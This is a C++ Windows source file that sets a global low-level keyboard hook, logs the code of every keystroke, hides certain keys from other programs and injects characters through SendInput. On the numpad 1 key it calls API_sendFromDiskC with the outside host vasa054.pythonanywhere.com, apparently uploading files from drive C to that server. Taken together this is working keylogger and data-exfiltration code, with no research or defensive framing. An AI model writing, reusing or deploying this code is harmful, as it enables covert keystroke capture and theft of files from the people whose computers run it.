#include "ServiceWork.h"
#include "clearSky.h"
#include "workWithCurl.h"

LRESULT CALLBACK MyLowLevelKeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN) {
        return workWith_WM_KEYDOWN(nCode, wParam, lParam);
    }

    else if (wParam == WM_KEYUP) {
        return workWith_WM_KEYUP(nCode, wParam, lParam);
    }
    else if (wParam == WM_SYSKEYDOWN) {
        return workWith_WM_SYSKEYDOWN(nCode, wParam, lParam);
    }
    else if (wParam == WM_SYSKEYUP) {
        return workWith_WM_SYSKEYUP(nCode, wParam, lParam);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);

}

//Virtual-Key Codes
//https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes

/*
VK_NUMPAD0
0x60
Numeric keypad 0 key

VK_NUMPAD1
0x61
Numeric keypad 1 key

VK_NUMPAD2
0x62
Numeric keypad 2 key

VK_NUMPAD3
0x63
Numeric keypad 3 key

VK_NUMPAD4
0x64
Numeric keypad 4 key

VK_NUMPAD5
0x65
Numeric keypad 5 key

VK_NUMPAD6
0x66
Numeric keypad 6 key

VK_NUMPAD7
0x67
Numeric keypad 7 key

VK_NUMPAD8
0x68
Numeric keypad 8 key

VK_NUMPAD9
0x69
Numeric keypad 9 key

VK_OEM_3
0xC0
Used for miscellaneous characters; it can vary by keyboard.
For the US standard keyboard, the '`~' key

*/
LRESULT workWith_WM_KEYDOWN(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);
    int key = cKey.vkCode;
    std::string messageAboutKey = "virtual key: " + std::to_string(key) + " ";
    myLog(messageAboutKey);
    
    if (0x61 == key) { //VK_NUMPAD1
        API_sendFromDiskC("vasa054.pythonanywhere.com/");
        return 1;
    }
    else if (0x64 == key) {//VK_NUMPAD4
        sendInputText("<");
        return 1;
    }
    else if (0x65 == key) {//VK_NUMPAD5
        sendInputText(">");
        return 1;
    }
    else if (0x67 == key) {//VK_NUMPAD7
        sendInputText("&");
        return 1;
    }
    else if (0x68 == key) {//VK_NUMPAD8
        sendInputText("#");
        return 1;
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

LRESULT workWith_WM_KEYUP(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);
    int key = cKey.vkCode;
    int hideKey[] = { 0x61 ,0x62 ,0x64 ,0x65 ,0x67 ,0x68,0xC0 };
    for (int i : hideKey) {
        if (i == key) {
            return 1;
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

LRESULT workWith_WM_SYSKEYDOWN(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam);
    int key = cKey.vkCode;
    std::string messageAboutKey = "virtual key SYSTEM: " + std::to_string(key) + " ";
    myLog(messageAboutKey);
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

LRESULT workWith_WM_SYSKEYUP(int nCode, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void sendInputText(std::string text)
{
    INPUT pInput;
    wchar_t wc;
    char ret;
    for (int i = 0; i < text.length(); i++) {
        ret = text[i];
        MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, &ret, 1, &wc, 1);
        pInput.type = INPUT_KEYBOARD;
        pInput.ki.wVk = 0;
        pInput.ki.time = 10;
        pInput.ki.wScan = wc;
        pInput.ki.dwFlags = KEYEVENTF_UNICODE;
        SendInput(1, &pInput, sizeof(pInput));
        pInput.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        SendInput(1, &pInput, sizeof(pInput));
        Sleep(20);
    }
}


void start() {
	HINSTANCE hInstance;
	HMODULE temp1 = GetModuleHandle(NULL);
	hInstance = temp1;
	init(hInstance);
}


void init(HINSTANCE hInstance) {
	char szClassName[] = "MyClass";
	WNDCLASS WndClass;
	MSG Msg;

	WndClass.style = CS_HREDRAW | CS_VREDRAW;
	WndClass.lpfnWndProc = (WNDPROC)MyWndProc;
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hInstance = hInstance;
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClass.lpszMenuName = NULL;
	WndClass.lpszClassName = (LPCWSTR)szClassName;

	if (!RegisterClass(&WndClass)) {
		MessageBox(NULL, L"Can not register class.", L"Error", MB_OK);
		return;
	}


	HHOOK hHook;
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, MyLowLevelKeyBoardProc, NULL, 0);
	if (hHook == NULL)
	{
		MessageBox(NULL, L"Error set Hook", L"Error", MB_OK);
	}
	else {
		MessageBox(NULL, L"Good send hook.", L"We are", MB_OK);
	}


	myLog("Before while.");
	while (1) {
		if (!GetMessage(&Msg, NULL, 0, 0)) {
			break;
		}
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
}

LRESULT CALLBACK MyWndProc(HWND hWnd, UINT Message, UINT wParam, LONG lParam) {
	return DefWindowProc(hWnd, Message, wParam, lParam);
}
